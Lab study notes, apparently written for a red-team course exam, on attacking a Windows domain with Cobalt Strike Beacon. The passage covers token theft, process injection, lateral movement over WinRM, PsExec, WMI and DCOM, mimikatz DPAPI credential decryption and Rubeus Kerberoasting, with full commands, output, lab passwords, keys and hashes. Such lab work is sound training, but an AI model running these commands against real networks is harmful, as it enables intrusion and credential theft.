MHAwUAQOEAAKURGA8yMDI1MTExOTAwMjQyMVqmERgPMjAyNTExMTkxMDI0MjFapxEYDzIwMjUxMTI2MDAyNDIxWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRZGV2LmN5YmVyYm90aWMuaW8=

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  jking
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  11/19/2025 12:24:21 AM
  EndTime                  :  11/19/2025 10:24:21 AM
  RenewTill                :  11/26/2025 12:24:21 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  p54W5zJmPXXgpjErEIk3kaDOQElYE6CUj5rNQkiZSoU=
  ASREP (key)              :  4A8A74DAAD837AE09E9ECC8C2F1B89F960188CB934DB6D4BBEBADE8318AE57C6


[11/19 00:24:26] [+] job 10 completed
```

### If no /domain is specified...

{% hint style="danger" %}
This is for OpSec, don't worry about in the exam but is good practice.
{% endhint %}

If no `/domain` is specified, Rubeus uses the FQDN of the domain this computer is in.  Instead, we can force it to use the NetBIOS name with `/domain:DEV`.  There is also an `/opsec` flag which tells Rubeus to request the TGT in such a way that results in the Ticket Options being `0x40810010`.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```

## Token Impersonation

{% hint style="warning" %}
Must be in an elevated session to see all processes for all users.
{% endhint %}

If we elevate or land on a system where a user is running a process, we can impersonate its token without having to jump through additional hoops.

**If we list the running processes on Workstation 2 from an elevated prompt, we see that `jking` is running an instance of `mmc.exe`:**

```
 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 5536  1020  mmc.exe                                x64   0           DEV\jking
```

<figure><img src="../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

**We can now steal its token and access a target:**

```
beacon> steal_token 21628

[+] Impersonated DEV\jking

beacon> ls \\web.dev.cyberbotic.io\c$
[11/19 00:29:10] [*] Tasked beacon to list files in \\web.dev.cyberbotic.io\c$
[11/19 00:29:11] [+] host called home, sent: 44 bytes
[11/19 00:29:12] [*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 08:38:47   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     11/18/2025 22:01:11   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     11/02/2022 09:32:00   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     09/26/2023 08:51:14   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     11/18/2025 21:51:12   DumpStack.log.tmp
 384mb    fil     11/18/2025 21:51:12   pagefile.sys

```

## Token Store

**This is an evolution on the `steal_token` command which allows you to steal and store tokens for future use.** &#x20;

**For example, steal a token and add it to the token store with `token-store steal <pid>`:**

```
beacon> token-store steal 21628

[11/19 00:31:16] [*] Tasked beacon to steal token from PID(s) 21628
[11/19 00:31:17] [+] host called home, sent: 24 bytes
[11/19 00:31:17] [*] Stored Tokens
```

#### List Stored Tokens

```
beacon> token-store show

 ID   User
 --   ----
 0    DEV\jking
```

#### Using Stored Tokens

```
beacon> token-store use 0
[+] Impersonated DEV\jking
```

#### But what if we drop impersonation?

Yes, the tokens will remain in the store so we can impersonate them once more.

#### Removing Tokens

```
token-store remove <id>

token-store remove-all
```

## Make Token

This <mark style="color:yellow;">allows us to impersonate a user if we know their plaintext password</mark>.

This works under the hood by calling the [LogonUserA](https://learn.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-logonusera) API.

```
beacon> make_token DEV\jking Qwerty123
[11/19 00:34:26] [*] Tasked beacon to create a token for DEV\jking
[11/19 00:34:28] [+] host called home, sent: 37 bytes
[11/19 00:34:28] [+] Impersonated DEV\jking (netonly)
```

**The logon session created with `LogonUserA` has the same local identifier as the caller but the alternate credentials are used when accessing a remote resource:**

```
beacon> remote-exec winrm web.dev.cyberbotic.io whoami
dev\jking
```

This also means that `make_token` is not applicable to anything you may want to run on the current machine.  For that, `spawnas` may be a better solution.

## Process Injection

This allows us to inject arbitrary shellcode into a process of our choosing.

We can inject into processes that we can obtain a handle to with enough privileges to write into its memory.

{% hint style="warning" %}
In a non-elevated context, this limits us to our own processes.

In an elevated context, this means that we can inject in processes owned by other users.
{% endhint %}

### Injecting into MMC process we identified earlier

```
beacon> inject 21628 x64 tcp-local

[11/19 00:39:17] [*] Tasked beacon to inject windows/beacon_bind_tcp (127.0.0.1:4444) into 21628 (x64)
[11/19 00:39:22] [+] host called home, sent: 334007 bytes
[11/19 00:39:32] [+] established link to child beacon: 10.10.123.102
```

{% hint style="success" %}
The command will also automatically attempt to connect to the child if a P2P listener is used. The resulting Beacon will run with the full privilege of the user who owns the process.
{% endhint %}

{% hint style="info" %}
The same caveats also apply - if the user closes this process, the Beacon will be lost.  The shellcode that's injected uses the Exit Thread function, so it won't kill the process if we exit the Beacon.
{% endhint %}

## Lateral Movement

This is the act of moving laterally between computers in a domain to access sensitive information/materials/creds/etc.

### Listing jump Methods w/ the jump Command

**We can use `jump` to see a list of methods:**

```
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

### remote-exec Strategy

```
beacon> remote-exec

Beacon Remote Execute Methods
=============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```

You also need to connect to P2P Beacons manually using `connect` or `link`.

### Remote Seatbelt Commands

**Some of Seatbelt's commands can also be run remotely, which can be useful enumerating its configurations and defences before jumping to it:**

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

====== OSInfo ======


[11/19 00:55:55] [+] [job 1] received output:
  Hostname                      :  web
  Domain Name                   :  dev.cyberbotic.io
  Username                      :  
  ProductName                   :  Windows Server 2022 Datacenter
  EditionID                     :  ServerDatacenter
  ReleaseId                     :  2009
  Build                         :  20348
  BuildBranch                   :  fe_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  2
  IsVirtualMachine              :  False
  BootTimeUtc (approx)          :  1/1/0001 12:00:00 AM (Total uptime: 739573:00:55:50)
  HighIntegrity                 :  True
  IsLocalAdmin                  :  True
  CurrentTimeUtc                :  11/19/2025 12:55:50 AM (Local time: 11/19/2025 12:55:50 AM)
  TimeZone                      :  
  TimeZoneOffset                :  
  InputLanguage                 :  
  InstalledInputLanguages       :  
  MachineGuid                   :  a2c3c656-7dd3-4c1d-81e9-9e78bfd50edf
```

## Windows Remote Management (WRM)

The `winrm` and `winrm64` methods can be used for 32 and 64-bit targets as appropriate.

### Lateral Movement SMB Beacon

```
beacon> jump winrm64 web.dev.cyberbotic.io smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10) on web.dev.cyberbotic.io via WinRM
[+] host called home, sent: 225172 bytes
[+] established link to child beacon: 10.10.122.30
```

WinRM will return a high integrity Beacon running as the user with which you're interacting with the remote machine as (see below).

<figure><img src="../../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>

## PsExec

The `psexec` / `psexec64` commands work by uploading a service binary to the target system, then creating and starting a Windows service to execute that binary. &#x20;

Beacons executed this way run as `SYSTEM`.

<figure><img src="../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

### psexec\_psh

`psexec_psh` doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit).  The pattern it uses by default is `%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand ...`.

```
beacon> jump psexec_psh web smb

[11/19 01:07:52] [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-252e42c2-36c5-4d41-a7b7-e80346ee1337) on web via Service Control Manager (PSH)
[11/19 01:07:54] [+] host called home, sent: 279052 bytes
[11/19 01:08:02] [+] received output:
Started service 99d3415 on web
```

* Be sure to note the `PIPE` in the output if you want to use it in WMI
  * This was the SMB `PIPE` Beacon listener we created at the start of the lab
* ```
  TSVCPIPE-252e42c2-36c5-4d41-a7b7-e80346ee1337
  ```

## Windows Management Instrumentation (WMI)

WMI is not part of the `jump` command, but it is part of `remote-exec`.

This command method uses WMI's "process call create" to execute any command we specify on the target.

### Usages

The most straight forward means of using this is to upload a payload to the target system and use WMI to execute it.

1. **You can upload a file to a remote machine by `cd`'ing to the desired UNC path and then use the `upload` command:**

```
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
Started process 3280 on web.dev.cyberbotic.io
```

2. **The process is now running on `WEB`, so we need to connect to it:**

* _**Use the****&#x20;****`PIPE`****&#x20;****obtained in the****&#x20;****`psexec_psh`****&#x20;****section just above**_

```
beacon> link web.dev.cyberbotic.io TSVCPIPE-252e42c2-36c5-4d41-a7b7-e80346ee1337

[11/19 01:13:12] [*] Tasked to link to \\web.dev.cyberbotic.io\pipe\TSVCPIPE-252e42c2-36c5-4d41-a7b7-e80346ee1337
[11/19 01:13:16] [+] host called home, sent: 131 bytes
[11/19 01:13:16] [+] established link to child beacon: 10.10.122.30
```

As with WinRM, the process will be running in an elevated context of the calling user.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## CoInitializeSecurity

Beacon's internal implementation of WMI uses a [Beacon Object File](https://cobaltstrike.com/help-beacon-object-files), executed using the [beacon\_inlin&#x65;_\__&#x65;xecute](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_inline_execute) Aggressor function.&#x20;

When a BOF is executed the [CoInitializeSecurity](https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity) COM object can be called, which is used to set the security context for the current process.

#### The bad

The unfortunate consequence is that if you have CoInitializeSecurity get called in the context of, say "User A", then future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process.

**An example of that can look like the following:**

```
beacon> make_token DEV\jking Qwerty123
[+] Impersonated DEV\bfarmer

beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to web.dev.cyberbotic.io: 5
```

#### If that is the case...

We know `jking` is a local admin on WEB but because `CoInitializeSecurity` has already been called (probably in the context of `bfarmer`), WMI fails with access denied. &#x20;

#### The workaround

As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as `spawn` and `spawnas`, or even `execute-assembly` with a tool such as `SharpWMI`.

```
beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"

[*] Host                           : web.dev.cyberbotic.io
[*] Command                        : C:\Windows\smb_x64.exe
[*] Creation of process returned   : 0
[*] Process ID                     : 3436
```

{% hint style="info" %}
This may not be necessary at all times.
{% endhint %}

## Distributed Component Object Model (DCOM)

### Invoke-DCOM.ps1

{% hint style="info" %}
This worked in a impersonated session as `jking`, it did not work with `SYSTEM` as I had received another error.

I simply just used `token-store use 0` to impersonate `jking` and ran it again and it worked.
{% endhint %}

```
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
[11/19 01:19:19] [*] Tasked beacon to run: Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
[11/19 01:19:23] [+] host called home, sent: 613 bytes
[11/19 01:19:23] [+] job registered with id 4
[11/19 01:19:23] [+] job 4 completed30

beacon> link web.dev.cyberbotic.io TSVCPIPE-252e42c2-36c5-4d41-a7b7-e80346ee1337
[+] established link to child beacon: 10.10.122.30
```

## Data Protection API (DPAPI)

This is a component of Windows that allows for encrypting and decrypting data "blobs".

It uses cryptographic keys that are tied to either a specific user or computer and allows both native Windows functionality and third-party.

### Usages

Essentially, DPAPI is used by the Windows Credential Manager to store secrets such as RDP credentials and third-party apps like Chrome to store website creds.

### Credential Manager

#### Vaults vs Credentials

A vault holds records of encrypted credentials and a reference to the encrypted blobs.

A credential is the actual encrypted credential blob.

#### Enumerating User's Vaults

#### Method 1: `vaultcmd`

{% hint style="info" %}
I had to `rev2self` to remove impersonation of `jking` back to `SYSTEM` in order to get this to work.
{% endhint %}

```
beacon> run vaultcmd /list

Currently loaded vaults:
	Vault: Web Credentials
	Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
	Location: C:\Users\bfarmer\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

	Vault: Windows Credentials
	Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
	Location: C:\Users\bfarmer\AppData\Local\Microsoft\Vault

beacon> run vaultcmd /listcreds:"Windows Credentials" /all

Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:target=TERMSRV/sql-2.dev.cyberbotic.io
Identity: SQL-2\Administrator
Hidden: No
Roaming: No
Property (schema element id,value): (100,2)
```

#### Method 2: `SeatBelt`

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

====== WindowsVault ======

  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials
  Item count     : 1
      SchemaGuid   : 3e0e35be-1b77-43e7-b873-aed901b6275b
      Resource     : String: Domain:target=TERMSRV/sql-2.dev.cyberbotic.io
      Identity     : String: SQL-2\Administrator
      PackageSid   : (null)
      Credential   : 
      LastModified : 9/6/2022 9:12:12 AM
```

We now know that the user has saved credentials for the local administrator account on `SQL-2`. The encrypted credentials themselves are stored in the users' "Credentials" directory.

```
beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
[11/19 01:41:50] [*] Tasked beacon to list files in C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
[11/19 01:41:52] [+] host called home, sent: 142 bytes
[11/19 01:41:52] [*] Listing: C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 468b     fil     09/06/2022 10:34:22   6C33AC85D0C4DCEAB186B3B2E5B1AC7C
 10kb     fil     08/30/2022 08:42:59   DFBE70A7E5CC19A398EBF1B96859CE5
```

### Seatbelt can also enumerate the credentials

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

  Folder : C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\

    FileName     : 6C33AC85D0C4DCEAB186B3B2E5B1AC7C
    Description  : Local Credential Data

    MasterKey    : bfc5090d-22fe-4058-8953-47f6882f549e
    Accessed     : 11/19/2025 1:43:17 AM
    Modified     : 11/19/2025 1:43:17 AM
    Size         : 468

    FileName     : DFBE70A7E5CC19A398EBF1B96859CE5D
    Description  : Local Credential Data

    MasterKey    : bfc5090d-22fe-4058-8953-47f6882f549e
    Accessed     : 11/19/2025 1:43:17 AM
    Modified     : 11/19/2025 1:43:17 AM
    Size         : 11036
```

**Seatbelt also provides the GUID of the master key used to encrypt the credentials.**

**The master keys are stored in the users' roaming "Protect" directory.  But guess what... they're also encrypted:**

```
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104
[*] Listing: C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 740b     fil     08/15/2022 17:34:31   bfc5090d-22fe-4058-8953-47f6882f549e
 928b     fil     08/15/2022 17:34:31   BK-DEV
 24b      fil     08/15/2022 17:34:31   Preferred
```

{% hint style="danger" %}
At this time, I have no fucking idea where RastaMouse got the GUID from. Seatbelt did not give me a GUID.

I will have to figure this out during the exam through some external research.
{% endhint %}

### Decrypting Credential Manager Master Key Blobs

#### Method 1

So we must decrypt the master key first to obtain the actual AES128/256 encryption key, and then use that key to decrypt the credential blob.  There are two ways of doing this.

The first is only possible if you have local admin access on the machine and if the key is cached in LSASS.  It will not be in the cache if the user has not recently accessed/decrypted the credential.

```
beacon> mimikatz !sekurlsa::dpapi

Authentication Id : 0 ; 5575183 (00000000:0055120f)
Session           : RemoteInteractive from 4
User Name         : bfarmer
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 11/18/2025 10:57:36 PM
SID               : S-1-5-21-569305411-121244042-2357301523-1104
	 [00000000]
	 * GUID      :	{69dda345-8390-4424-bd18-9447b6cc33df}
	 * Time      :	11/18/2025 11:08:13 PM
	 * MasterKey :	c545612634c5927835c66ecfcca8c62137b4eb721e61b1e600715fda0d3f53cf6aca6d5d7985409c25cf024a77814e5b8015f6164c306665a4b53ca1196251b4
	 * sha1(key) :	b4b67daf51a26c6f6b5426bc3a3248051a69aac2
	 [00000001]
	 * GUID      :	{bfc5090d-22fe-4058-8953-47f6882f549e}
	 * Time      :	11/18/2025 11:45:13 PM
	 * MasterKey :	8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
	 * sha1(key) :	897f7bf129e6a898ff4e20e9789009d5385be1f3
	 [00000002]
	 * GUID      :	{d4d8050a-e73c-4a89-93d2-ab13ae1168eb}
	 * Time      :	11/18/2025 11:45:13 PM
	 * MasterKey :	3f7b9b9e6dc648ef4ec994e36cc1d5427b54dca6b0884787027514cd9ed69023cbf9d9e5156f328656e04dbcb4436ccb066eec93c12ea492ae381f239912bef4
	 * sha1(key) :	691018bb014b06292c82639df4380b0cb279e9b7
	 [00000003]
	 * GUID      :	{3cc43f4f-efc7-457f-866d-02cada65ab2b}
	 * Time      :	11/18/2025 11:45:14 PM
	 * MasterKey :	f67280247c358391d6ac15c032ee797733254e27d9e444774eeaed248990ecd6620b1bed606b15161bcc5075f9346a883edc907976e2f07c60faf4838f5e7821
	 * sha1(key) :	6eb8b11154ec0930b9b59c5f0d55b2b1c8837da8
```

#### Method 2

Another way to obtain the master key (which does not require elevation or interaction with LSASS), is to request it from the domain controller via the Microsoft BackupKey Remote Protocol (MS-BKRP).&#x20;

**This is designed as a failsafe in case a user changes or forgets their password, and to support various smart card functionality:**

```
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

[domainkey] with RPC
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
  key : 8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
  sha1: 897f7bf129e6a898ff4e20e9789009d5385be1f3
```

{% hint style="warning" %}
This will only work if executed in the context of the user who owns the key.  If your Beacon is running as another user or SYSTEM, you must impersonate the target user somehow first, then execute the command using the `@` modifier.

* Since this was the case, I had to go back to my `bfarmer` Beacon session.
{% endhint %}

#### Decrypting the Blob

```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214

  UserName       : SQL-2\Administrator
  CredentialBlob : wIfY&cZ&d?QP9iMFEzckmj.34=@sg.*i
```

## Scheduled Task Credentials

Scheduled tasks can save credentials on a machine so they can run under the context of a user without them having to be logged on.

_**If we have local admin privs on a machine, we can decrypt them in much the same way.**_

{% hint style="success" %}
**Blobs are saved under:**&#x20;

`C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\`.
{% endhint %}

{% hint style="info" %}
I had to go to a Beacon session with a context of `SYSTEM` for this to work.
{% endhint %}

```
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 528b     fil     08/16/2022 14:55:28   F3190EBE0498B77B4A85ECBABCA19B6E
```

#### `dpapi::cred` tells us the GUID of the master key used to encrypt each one

```
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

  guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
```

#### `sekurlsa::dpapi` to dump cached keys

```
beacon> mimikatz !sekurlsa::dpapi

 * GUID      :	{aaa23e6b-bba8-441d-923c-ec242d6690c3}
	 * Time      :	11/19/2025 1:57:59 AM
	 * MasterKey :	10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
	 * sha1(key) :	cfbc842e78ee6713fa5dcb3c9c2d6c6d7c09f06
```

#### Decrypting

```
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

  TargetName     : Domain:batch=TaskScheduler:Task:{86042B87-C8D0-40A5-BB58-14A45356E01C}
  UserName       : DEV\jking
  CredentialBlob : Qwerty123
```

## Kerberos

### Kerberoasting

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap

[*] Total kerberoastable users: 3

$krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc/sql-2.dev.cyberbotic.io:1433@dev.cyberbotic.io*$57A749FC1E6C15940497B032BB9A1471$56E5F4C625A9B672585444F22921A0215A7582F951265656310BD609E58759EEA6F34923796A7FED0A3099B739C8DB082E476DB426235C7845557038E57E683B6860CCE684B4BB48FB0BEDDE2B1010D85EA88D6CDD7A3223D2126479E562E73ECB23488C94A0444CE5653EEB468683D19A9739F993E12D00DF60B30B347A23A34887B7FFCBE73AF676E2748575FF56A84AF12B8B2263D830934A0A9EFE7F2570141CF832BEEE777EF95EDE660D1651B3F53BAB9D308930934B844344D65CDB15F98328FD53119A129B0F49A37B440EF88AD7AF6E85C738A38965DDCCAA1F16F8BFD945F4DFB89E49F3238959F443E78B7DAE92C56C949CC9CF3D9DE7712A2D985FC59F657EAB524B331109DABD3F42F9B9A50D8CF6C3BB35D3A90D13FAFCB217B9D916051EFA381F41E8E3B5811309871C41467FAEE064DDAA2FE8C102747D471A48BA7B6CB4D0901E4061F6B4FAEE9EA1839C20FFDB94AC6CBD897D016F37D859495FD95A9C86E093C32321AEEFD7C57E33B2591B6998BA3FCBDE711F4823C13ECF6CB637E6A8F4A577695CD4DE076D5174F02CD3C8A88502BA78AFB3EAC8D16939B1C669FCFFD20B7975B7166DFB84454C721CF632B857766BBAB4D0D079AEA2F0D47F5E4974021A8D69A3B5802A622976C7880F2377BD25607B9E9A3736069DA6CB75BE06B065C542421D2BE33F3E4537B6B8D9A85ABB1205EFD63A607C2234A1F84CB2A62433283FC426360BE8F13FFE89D3804C52F4F1D35E122164CE3887947A7A23BD2AB2DEEA49EF68C1D8957877D6C4801AF50AA1FA15CFF52BDD5817432D38E888E1808FFF114608646FE5C18E2C75AC7C0BFF808CBAB17354A492551B2576A90425AAAD02AB329FAEBE4BD43A2CFE0563D307ADA9710D91ED983E52633EBC560686300A921AD5EC27B7D82C35932F1CF34FB6DB592CE5EBCCCFAF09B2E9B71831DE4397EE72303AE3DD98A952B3031E4A776C02CD18D135F5260253365CAF8CADC2E39EFCBCC343CF9B016E68B6DC95C928D4A9C7AEB8061A7D6BDFD432444426F663F09488463A333BC4FBDBF816428150B304F775A3030B3E61FCA1BBC68889DF408E2F201E6E433A72D2AC5BDCDABAAF202CE6C5725CAEB8BCA3B09276609F632F6C69560CCC261ABDBF23B6003038610CE926F108867F76BD625C3D49D4389E4B51F3B68F498ECF0B15171E88F1099A27475E2227A3C6E500316D6BCA0EF0BCFA5CD0913495243FBE5EEEE335742F9EBB76A173CAA83B12CE00D17A814389D4E9F38302DA3C07096DEA62742E351733E4350B3480C2EA9E3A22F1AF39B404E3A80F6C8E36E4759BF36D9A32A357B2695300F0AE624D4952E0950AE7C2A58B5C0238188E9AAE21BFB4E5E9ACC2ACF1C8B3AC25EE958AE41BE08A53E160FE064EF5220874DE275B9E29EA7C816E44149737BF7F3F2BC60005314A272660C420457232D5EFB0FC1C0A8CA6D34C907CA1969E671E52055805F54BD1241E3F4C6E55B8A1517AD9DA058D0166E1C43075638E18B77E3A8E08C9340C7689147B61F11A1EED833D4409A550E574911E3C1647D1FF49D78381A9C643AFB63637B1B1A0F0CC0B14B96B
$krb5tgs$23$*squid_svc$dev.cyberbotic.io$HTTP/squid.dev.cyberbotic.io@dev.cyberbotic.io*$E6D91D2785E22D99B50C903C21B4B7F2$E5B53897FA2045E2DFCB2C6B4611C35C97B131A17B6E032ADF485AC3AFF707DA9DC14B6ADE052CFD1ECD94DFA5B635D7C823F927D0DF1D79DF648B999BE10E4133EEDE0C5BDD2A6710ED5CAF51B53198AEB03B21E5612EDB0E2E7CD61243DF91835A7EF71537645B2804E8552C50F9364AE34ED815FBD0828AD0F920FA99F23E8F56FB47D0CC15172FFF00C64785E38484C3F2FCA04D9FF27257E29E4759DE7021E5A120DA96B194E9D043E77044520AEC013CDA0A3A73BABA7DD0B5EC2FB133DDA50D777F08C814A6C0C05B3F5FAFF6067A3D34F4F47F69111CA63592B3CA70E531096E4F10C73A04544BA474D9D22279375F6F323E714AC85D7D91A227E766FD3CE41FF4C3CEA013B5982124373D6C2CF85D5D0C1594DCAC58522054B289CAE2A91CC9446441E6505182445CE24F0F77E93D2C50389236076946A073D35BA71D798755896728055B9891D19D7B1B98EE333A34537272D57EAF631598DCB85E4F911ABCA2494AFE2E327EAD2171E668BA5B2F8BDFDC09984A01616405BFD7CE4DA098D920EB8AF742C66463BB769E8B181F5E3A4E9CB6C1744C7CCC985F002D8FBCE11170B499AE3B451B8C641E04086E88F12250B5C33D44301E1A01D1B22FBEA432DEF4CC01818689C97A9948E41130F4594E5D309CAE8136686FAFEB94C67A87F71B7670F1183873C26AF0281F9395738760BC68354079A4A76333D06C3C726EB6B529D07D8DCF0201E280950A6C1C6F82F99C32101FA9E1249314C8C3DA58F33806C00AC5806E7DCBF08F8197936983B6002E9A5E9806D817FCA37D8C6E40ABE0B326B5921DD7A05F39C395E1A34075043E527AC2B7845928D5D21E9C5E0D4687DB85C6778AFEA9645DC5BFF53BAC467D6457C4B819CE0CCC1829CCA364CB6A5995A1650B210B95EE89DE7A17C7B5FCC8F65738BF504F1086DD5E1C4A24BCF69FA5F268330906B1E69FE1ACE9ABB8877B1DE884B4362C6FB77EB0E1BDEF5B320B9909AF13A8EAAE488E188361BC862B4A239B5212F9693328C082DD93F1C7FFF37D6CD4A4CB033FBF8EFE7FEAA657F935600EB6F611E0CE7C5F9266696D8E6515AE69467C69319D0D35BE73C3A8B57483502927549C51AB7AA472EE0CFA2F210652F405D85EF936A7200D6D74038BDC5C03AB160BFD3F6635238183CE79C7350171E6552F300CEF1972D75667FF37B2DB70A1E17054B899B32F2E4F06FCFF94D991287AB4E6679B77D46B1010117765D204CD27E0987609A3418E793E33B3B7E052F5C0E3CF03ACCFB3A26B5792D7260554C472D0686ECFC51EE23D8A535DBB6B49F3832E69C1159CBC5DCB18C135D0AEAFE5F1D0268AEBA935CB2CA679A0C8D2DF876DF84AC0D4FCCD69B5B7EEB1B551F5B2AF34D6A61C42D861AC893CCA86884090EBA795F8A0844646F41A54B612D81049A65BDC952AA7A516BD5AB8AC9C36A3DA37ABE2371822C703EA9787799B486EDE1B8A55A09D7C04BC70EDE43264A5C8EEF2BD85A39DCAED93C8469942BCEBA08BEB81EB71D9E6837AC67912F02D3170FD9C2FCCCB6C53F79386A4781D43A57B72CF917AF95C236E4E6F38F5DAD9A52DE10D5EC081494B98
